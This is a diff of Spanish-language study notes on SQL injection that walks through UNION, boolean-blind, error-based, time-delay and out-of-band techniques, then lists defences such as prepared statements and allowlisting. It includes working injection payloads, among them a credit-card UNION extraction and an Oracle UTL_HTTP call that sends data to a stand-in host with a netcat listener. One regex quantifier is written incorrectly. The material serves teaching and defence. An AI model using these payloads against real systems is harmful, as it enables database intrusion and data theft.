@@ -1345,14 +1345,18 @@ Una aplicación es vulnerable a ataques de este tipo cuando:
 - Tenemos una consulta SQL que usa un parámetro que el usuario ingresa:
 
 ```sql
-select title, text from news where id=$id
+select title, text
+from news
+where id=$id
 ```
 
 - Si el usuario ingresa el string: `id= "1 or 1 = 1"`
 - La consulta pasa a ser:
 
 ```sql
-select title, text from news where id=1 or 1=1
+select title, text
+from news
+where id=1 or 1=1
 ```
 
 - Lo cual, en vez de retornar un solo registro, retorna todos, ya que la condición `or 1=1` **siempre** es verdadera, y con que una de las dos partes del or sea verdadera, toda la condición múltiple es verdadera.
@@ -1428,28 +1432,292 @@ corresponds to your MariaDB server version for the right syntax to use near
 
 ##### Union
 
+- El operador **UNION** se usa en inyecciones SQL para unir una query diseñada por el tester a la query original, lo que permite obtener los valores de las columnas de otras tablas.
+- Ejemplo:
+
+  - Tenemos la query:
+
+  ```sql
+  SELECT Name, Phone, Address
+  FROM Users
+  WHERE Id=$id
+  ```
+
+  - Y se pasa como parámetro el string "1 UNION ALL SELECT cardNumber,1,1 FROM CreditCards":
+
+  ```sql
+  SELECT Name, Phone, Address
+  FROM Users
+  WHERE Id=1
+  UNION ALL
+  SELECT cardNumber, 1, 1
+  FROM CreditCards
+  ```
+
+  - Esta nueva consulta manipulada une el resultado original con **todos los datos de tarjetas de crédito**.
+  - La sentencia **ALL** es necesaria para solucionar que exista algún DISTINCT en la consulta original.
+  - Después de cardNumber hay **1, 1** porque para que UNION no de error de sintaxis la **primer consulta tiene que tener el mismo número de columnas que la segunda**.
+
+- Lo primero que se tiene en cuenta para este tipo de técnica es encontrar la cantidad correcta de columnas en el SELECT.
+  - Para esto, se puede usar ORDER BY seguido de un número de columna: `http://www.example.com/product.php?id=10 ORDER BY 10--`
+  - Si la query ejecuta, es porque **hay 10 o más columnas en esa tabla**.
+  - Si la query no ejecuta, hay **menos de 10 columnas**: `Unknown column '10' in 'order clause'`
+- Luego de encontrar el número de columnas se debe encontrar el tipo.
+  - Se puede usar NULL para ayudar: `http://www.example.com/product.php?id=10 UNION SELECT 1, NULL, NULL--`
+  - Si esto falla, veremos algo así: `All cells in a column must have the same datatype`, lo cual indica que la primer columna no es de tipo integer.
+  - Si ejecuta bien, significa que la primer columna es de tipo integer, entonces podemos seguir con la siguiente columna: `http://www.example.com/product.php?id=10 UNION SELECT 1, 1, NULL--`
+- Luego de lograr una inyección exitosa, dependerá de cada aplicación cuántos resultados se muestran.
+  - A veces se muestra un solo resultado: en este caso podemos usar LIMIT o un valor inválido de id para que la primer consulta de vacío y la segunda si nos retorne datos (suponiendo que en la tabla no hay entradas con ID 99999): `http://www.example.com/product.php?id=99999 UNION SELECT 1, 1, NULL--`
+
 ##### Boolean
+
+- Esta técnica se usa cuando la aplicación no muestra directamente el resultado de la query SQL, pero sí cambia su comportamiento según si una condición es verdadera o falsa.
+- Mecanismo:
+  - Inyectar una condición booleana en una query SQL vulnerable.
+  - Observar diferencias en la respuesta de la aplicación:
+    - Si la condición es **TRUE**, la aplicación puede mostrar un mensaje, cargar un contenido o responder de manera diferente.
+    - Si la condición es **FALSE**, la respuesta cambia (ej: "No se encontraron resultados", página en blanco, etc.).
+  - Extraer datos carácter por carácter comparando respuestas booleanas.
+- Ejemplo:
+
+  - Supongamos: `http://www.example.com/product.php?id=1'` (se le agrega una comilla al final).
+    - Esto dará un error customizado.
+  - Suponemos que la query en el server es:
+
+  ```sql
+  SELECT field1, field2, field3
+  FROM Users
+  WHERE Id='$Id'
+  ```
+
+  - Como queremos obtener el valor del campo username, entonces los test que ejecutamos serán para obtener el valor de ese campo, caracter a caracter.
+  - Esto se puede lograr vía funciones como SUBSTRING, ASCII, LENGTH.
+  - Mediante dichas funciones, ejecutaremos nuestras pruebas sobre el primer carácter y, cuando hayamos descubierto el valor, pasaremos al segundo y así sucesivamente, hasta haber descubierto el valor completo.
+  - Las pruebas aprovecharán la función SUBSTRING, para seleccionar solo un carácter a la vez (seleccionar un solo carácter significa imponer el parámetro de longitud a 1), y la función ASCII, para obtener el valor ASCII, de modo que podamos hacer una comparación numérica.
+  - Los resultados de la comparación se realizarán con todos los valores de la tabla ASCII, hasta encontrar el valor correcto.
+  - Con estas funciones iremos descubriendo uno a uno los caracteres hasta descubrir todo el valor. Por ejemplo, el argumento: `$Id=1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1` generará la siguiente query:
+
+  ```sql
+  SELECT field1, field2, field3
+  FROM Users
+  WHERE Id='1' AND ASCII(SUBSTRING(username, 1, 1)) = 97 AND '1' = '1'
+  ```
+
+  - Esto devuelve algo sólo si el valor ASCII es 97.
+    - Si da falso incrementamos de 97 a 98 y volvemos a preguntar.
+    - Si da verdadero cambiamos el índice del substring para el siguiente carácter del campo username.
+  - Por último, se necesita una forma de distinguir los true de los falses. Para hacerlo creamos una query que siempre devuelva false, usando por ejemplo el argumento: `$Id=1' AND '1' = '2` el cual deriva en la query:
+
+  ```sql
+  SELECT field1, field2, field3
+  FROM Users
+  WHERE Id='1' AND '1' = '2'
+  ```
+
+  - Este método no siempre funciona ya que puede ocurrir que el servidor devuelva siempre valores distintos aunque ejecutamos dos veces la misma query.
+  - En ese caso particular hay que aplicar filtros que nos permitan eliminar el código de respuesta que cambia entre los dos requests y así lograr obtener el template para comparar.
+  - A partir de ahí simplemente comparamos con el template obtenido las distintas respuestas de la aplicación y así sabremos si es true o false.
+  - El test termina usando características de SUBSTRING y de LENGTH.
+
+    - Cuando el test compare el carácter actual con el ASCII code 0 y retorne true quiere decir que, o terminamos con el campo, o tiene un valor null en el medio del string.
+    - Usando el argumento: `$Id=1' AND LENGTH(username)=N AND '1' = '1` donde N es el número de caracteres que encontramos hasta ahora sin contar el null, la query es:
+
+    ```sql
+    SELECT field1, field2, field3
+    FROM Users
+    WHERE Id='1' AND LENGTH(username)=N AND '1' = '1'
+    ```
+
+    - Si ésta da true entonces terminamos de analizar.
+
+- Esta técnica suele requerir un gran número de consultas por lo que no es realizable a mano, si no que requiere herramientas de inyección automatizadas.
 
 ##### Error based
 
+- Consiste en obligar a la DB a realizar alguna operación en la que el resultado será un error.
+- El objetivo es intentar extraer algunos datos de la DB y mostrarlos en el mensaje de error.
+- Esta técnica es útil cuando el tester, por alguna razón, no puede aprovechar la vulnerabilidad de inyección SQL usando otra técnica como UNION.
+- Cómo realizar el ataque depende mucho de cada DBMS.
+- Ejemplo:
+
+  - En Oracle 10, si tenemos la query:
+
+  ```sql
+  SELECT *
+  FROM products
+  WHERE id_product=$id_product
+  ```
+
+  - Y en la URL se inyecta: `http://www.example.com/product.php?id=10||UTL_INADDR.GET_HOST_NAME((SELECT user FROM users) )--`
+  - Se concatena el valor 10 con el resultado de la función de Oracle UTL_INADDR.GET_HOST_NAME.
+    - Esta función intenta devolver el host que se le pasa por parámetro, pero como le estamos enviando una query y no un host, resulta en un error: `**ORA-292257: host 10SCOTT unknown**`
+  - En este caso, obtuvimos el nombre del usuario de la DB (quizá el admin).
+  - Entonces enviando distintas cosas a GET_HOST_NAME() podremos exponer una amplia variedad de datos de la DB.
+
 ##### Time delay
+
+- Consiste en enviar una consulta inyectada y en caso de que el
+  condicional sea verdadero, el tester puede monitorear el **tiempo que tarda el servidor en responder**.
+  - Si hay un retraso, el tester puede asumir que el resultado de la consulta es verdadero.
+- Se envía una operación de delay y se espera por la respuesta.
+- Nuevamente útil en casos de Blind SQL.
+- Ejemplo:
+
+  - Se tiene la query:
+
+  ```sql
+  SELECT *
+  FROM products
+  WHERE id_product=$id_product
+  ```
+
+  - Se realizan dos inyecciones distintas:
+    - `http://www.example.com/product.php?id=10`
+    - `http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(10), ‘false’)`
+      - Se verifica si la versión del motor es MySql versión 5.x o no, en cuyo caso el delay será de 10 segundos.
+  - Y se observa la diferencia del tiempo de respuesta entre ambas.
+  - Monitoreando las respuestas se van comprobando los resultados.
+  - Y en base a eso se va regenerando la base de datos.
 
 ##### Out-of-band
 
+- Consiste en usar funciones de los DBMS para realizar uan conexión fuera de banda y entregar los resultados de la consulta inyectada como parte de la solicitud al servidor del probador.
+- Al igual que en las técnicas basadas en errores, cada DBMS tiene sus propias funciones.
+- Útil en casos de Blind SQL.
+- Ejemplo:
+
+  - Tenemos el argumento: `?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM users)--` y la query:
+
+  ```sql
+  SELECT *
+  FROM products
+  WHERE id_product=$id_product
+  ```
+
+  - El tester concatena el valor del producto con id 10 con el resultado de la función UTL_HTTP.request.
+  - Oracle tratará de conectarse con ‘testerserver’ y hacer un HTTP GET request conteniendo el resultado: `SELECT user FROM users`.
+  - El tester necesita montar un webserver o alguna herramienta como netcat y esperar por la conexión: `/home/tester/nc –nLp 80`.
+  - Recibiendo el requerimiento del Oracle en el netcat: `GET /SCOTT HTTP/1.1 Host: testerserver.com Connection: close`.
+  - Nuevamente, obtenemos el nombre Scott.
+
 #### Prevención/defensas
+
+##### Introducción
+
+- Como todas las inyecciones SQL ocurren cuando el usuario introduce datos que van a formar parte de la query SQL, hay dos opciones generales para evitarlas:
+  - Dejar de escribir queries dinámicas.
+  - Evitar que los datos que ingresa el usuario modifiquen el SQL original.
 
 ##### Principales
 
+###### Prepared Statements
+
+- También conocidas como consultas parametrizadas.
+- Son simples de escribir y de leer a comparación de las consultas concatenadas.
+- Obligan al dev a definir primero todo el código SQL, y luego pasar cada parámetro a la query más tarde.
+  - Este estilo de programación permite que la DB distinga entre código vs datos, independientemente de la entrada del usuario.
+  - Por ejemplo, cuando el userID sea `'or '1''1`, la consulta no tendrá inyección si no que buscará por un usuario que sea literalmente = `' or '1'='1`.
+- La implementación depende del lenguaje:
+  - **Java EE**: Se usa `PreparedStatement()`.
+  - **.NET**: Se usa `SqlCommand()` o `OleDbCommand()`.
+  - **PHP**: Se usa PDO (PHP Data Objects).
+  - **Hibernate**: Se usa `createQuery()`.
+  - **SQLite**: Se usa `sqlite3_prepare()`.
+- Ejemplo en Java:
+
+  - Sin PS:
+
+  ```java
+  String query = "SELECT * FROM usuarios WHERE usuario = '" + usuario + "' AND password = '" + password + "'";
+  ```
+
+  - Con PS:
+
+  ```java
+  String sql = "SELECT * FROM usuarios WHERE usuario = ? AND password = ?";
+  PreparedStatement ps = conn.prepareStatement(sql);
+  ps.setString(1, usuario);
+  ps.setString(2, password);
+  ```
+
+###### Stored Procedures
+
+- Los Stored Procedures no siempre están a salvo de la inyección de
+  SQL.
+- Sin embargo, ciertos Stored Procedures tienen el mismo efecto que el uso de consultas parametrizadas cuando se implementan de forma segura.
+- Requieren que el desarrollador simplemente cree declaraciones SQL con parámetros que se parametrizan automáticamente a menos que el desarrollador haga algo que se salga de la norma.
+- La diferencia entre ambas es que el código SQL para un procedimiento almacenado se define y almacena en la propia DB y luego se llama desde la aplicación.
+- Si tenemos SP, en general hay menos probabilidades de SQL injection.
+- Un valor agregado es solo darle permisos de ejecución de SP al usuario de la aplicación y nada más.
+- En general con SP hay mejor performance.
+- Se podría mejorar la separación de roles al no permitir que cualquier desarrollador genere SQL si no sólo a los especializados en DBs.
+- Respetar menor privilegio y no dar root.
+
+###### Escaping User Input
+
+- Cada DBMS soporta uno o más formas de escaping dependiendo del tipo de consulta.
+- Si se usa el tipo adecuado para escapar los datos ingresados por el usuario, entonces el DBMS no tendrá problemas en diferenciar el código SQL de los datos.
+- Consiste en reemplazar los caracteres que pueden causar problemas, por eso **dependerá de cada DBMS donde cada carácter tiene una función distinta**.
+- No es el método más recomendable, se prefiere usar Prepared Statements.
+- Por ejemplo, en PHP, la función que se usa es `addslashes()`.
+  - Devuelve una cadena con barras invertidas delante de los carácteres que necesitan escaparse en situaciones como consultas de DB.
+  - Los caracteres que se escapan son la comilla simple ('), comilla doble ("), barra invertida (\\) y NUL (el byte NULL).
+- Otro ejemplo, en MySQL:
+  - Soporta 2 modos de escape:
+    - Modo ANSI_QUOTES_SQL: Cada ' (comilla simple) se encierra entre '' (comillas dobles).
+    - Modo MySQL.
+- Es muy recomendado usar la función de escape de la misma DB.
+
 ##### Adicionales
 
-#### Prepared Statements
+###### Principio de mínimo privilegio
 
-#### Stored Procedures
+- Para minimizar el daño potencial de un ataque de inyección SQL exitoso, hay que recortar lo más posible los permisos de todas las cuentas de acceso a la DB.
+- Por ejemplo, para que dar permisos de **escritura** a un usuario si sólo necesita **leer** una tabla?
+- Tener en cuenta **crear vistas** cuando sólo se necesita que el usuario tenga acceso a una parte de una tabla.
+- Si usamos SP, **sólo habilitar a los usuarios a ejecutarlas cuando sea necesario**, no habilitar a todos a ejecutar todos indiscriminadamente.
+- El mismo principio aplica a los permisos con que se ejecuta el DBMS, **evitar hacerlo con usuarios privilegiados**.
+- Por ejemplo en MySQL suele ejecutarse como Administrador, reestringirlo a correr como un usuario más acotado.
+- No usar el mismo usuario para distintas aplicaciones web que interactuan con distintas DBs en el mismo DBMS.
 
-#### Escaping User Input
+###### Lista blanca
+
+- Técnica por la cual todo aquello que no este expresamente permitido, está prohibido.
+- Es útil para datos **bien estructurados** como ser:
+  - DNI.
+  - CUIT.
+  - Mail.
+  - Códigos postales.
+  - etc.
+- Para realizar la validación de datos estructurados es útil el uso de expresiones regulares (regex).
+- Sirve también para los datos que el usuario ingresa a partir de subconjuntos fijos como pueden ser combo box o listados.
+- Los más difíciles son aquellos que provienen desde campos de entrada del tipo **libre**, aunque puede prefijarse por ejemplo un **largo máximo de input**.
+- Se puede utilizar para detectar cuando una entrada desautorizada quiere llegar al motor SQL.
+- Pero si hay un cambio en, por ejemplo, la estructura del número de pasaporte, esto implica cambiar los sistemas de lista blanca.
+- Ejemplos:
+
+  - Validación de la selección de un estado de EE. UU. desde un menú desplegable:
+
+  ```
+  ^(AA|AE|AP|AL|AK|AS|AZ|AR|CA|CO|CT|DE|DC|FM|FL|GA|
+  GU|HI|ID|IL|IN|IA|KS|KY|LA|ME|MH|MD|MA|MI|MN|MS|MO|
+  MT|NE|NV|NH|NJ|NM|NY|NC|ND|MP|OH|OK|OR|PW|PA|PR|RI|
+  SC|SD|TN|TX|UT|VT|VI|VA|WA|WV|WI|WY)$
+  ```
+
+  - Validación de un campo de texto que acepta **números y letras tanto mayúsculas como minúsculas**:
+
+  ```
+  ^[a-zA-Z0-9]+$ (Cualquier número de caracteres alfanuméricos)
+  ^[a-zA-Z0-9]{1-100}$ (entre 1 y 100 caracteres alfanuméricos)
+  ```
 
 #### Explotación automatizada
 
+- Todos los ataques de SQL Injection se pueden ejecutar automáticamente mediante el uso de herramientas.
+- Hay que encontrar la que nos quede cómodos, dependerá mayormente del ambiente que usa el analista.
+- La opción más reconocida en el software libre es **[SQLMap](https://github.com/sqlmapproject/sqlmap)**.
+- Este tipo de herramientas se deben usar con cuidado, en aplicaciones de **prueba** y con consenso.
 
 ---
 
